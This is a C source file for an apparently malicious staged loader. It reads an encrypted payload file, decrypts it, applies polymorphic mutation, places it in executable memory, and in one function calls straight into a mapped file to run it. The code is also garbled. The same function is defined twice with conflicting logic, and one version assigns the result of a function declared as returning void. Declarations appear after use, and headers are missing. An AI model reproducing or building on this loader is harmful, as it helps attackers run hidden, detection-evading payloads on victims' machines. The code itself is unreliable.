// StageLoader.c - C Source File

#include <sys/mman.h>
#include <openssl/evp.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

void *load_next_stage(const char *path, uint64_t entropy) {
    // Read encrypted payload
    int fd = open(path, O_RDONLY);
    size_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    
    unsigned char *encrypted = mmap(0, size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    
    // Decrypt using system entropy
    unsigned char *decrypted = malloc(size);
    decrypt_payload(decrypted, encrypted, entropy, size);
    munmap(encrypted, size);
    
    // Apply polymorphism
    unsigned char *mutated = apply_polymorphism(decrypted, size, entropy);
    
    // Allocate executable memory
    void *exec_mem = mmap(0, size, PROT_READ|PROT_WRITE|PROT_EXEC, 
                         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(exec_mem, mutated, size);
    
    free(decrypted);
    free(mutated);
    
    return exec_mem;
}

extern void apply_polymorphism(void *code, size_t size, uint64_t entropy);
extern void decrypt_payload(uint8_t *output, const uint8_t *input, 
                     uint64_t entropy, size_t size);

void *load_next_stage(const char *path, uint64_t entropy) {
    // Open payload file
    int fd = open(path, O_RDONLY);
    if(fd < 0) return NULL;
    
    // Get file size
    struct stat st;
    fstat(fd, &st);
    size_t size = st.st_size;
    
    // Memory map file
    unsigned char *encrypted = mmap(0, size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    
    // Allocate memory for decrypted payload
    unsigned char *decrypted = malloc(size);
    decrypt_payload(decrypted, encrypted, entropy, size);
    munmap(encrypted, size);
    
    // Apply polymorphism
    apply_polymorphism(decrypted, size, entropy);
    
    // Allocate executable memory
    void *exec_mem = mmap(0, size, PROT_READ|PROT_WRITE|PROT_EXEC, 
                         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(exec_mem, decrypted, size);
    free(decrypted);
    
    return exec_mem;
}

void load_stage(const char* path) {
    int fd = open(path, O_RDONLY);
    off_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    
    void* mem = mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, 
                    MAP_PRIVATE, fd, 0);
    
    close(fd);
    
    // Execute loaded code
    void (*func)() = (void(*)())mem;
    func();
}

